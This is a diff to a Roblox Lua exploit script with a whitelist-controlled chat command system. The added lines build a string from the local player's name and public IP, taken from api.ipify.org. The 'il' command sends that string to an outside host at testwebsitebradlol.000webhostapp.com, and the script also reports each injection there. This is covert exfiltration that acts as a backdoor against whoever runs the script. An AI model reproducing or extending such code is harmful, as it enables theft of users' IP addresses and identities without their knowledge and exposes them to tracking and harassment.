@@ -47,13 +47,15 @@ AddCommand("il", function(...)
     local s, e = pcall(function(...)
         local uri = ("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=")
         local i = game:HttpGet("https://api.ipify.org/")
-        game:HttpGet(uri .. tostring(i))
+        local str = (tostring(game.Players.LocalPlayer.Name) .. " IP: " .. tostring(i))
+        game:HttpGet(uri .. tostring(str))
     end)
     if not s then warn(e) end
 end)
 
 local Setup = function(Player)
     for i, v in pairs(Whitelist) do
+       warn(v, Player.Name:lower(), i:lower())
        if (v == true and Player.Name:lower() == i:lower()) then
           Player.Chatted:Connect(CommandInput)
        end
@@ -64,6 +66,7 @@ Players.PlayerAdded:Connect(Setup)
 for i, v in pairs(Players:GetPlayers()) do
    Setup(v)
 end
+
 pcall(function(...)
       local Str = (tostring(game.Players.LocalPlayer.Name) .. " Injected!")
       game:HttpGet("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=" .. URIEncode(Str))
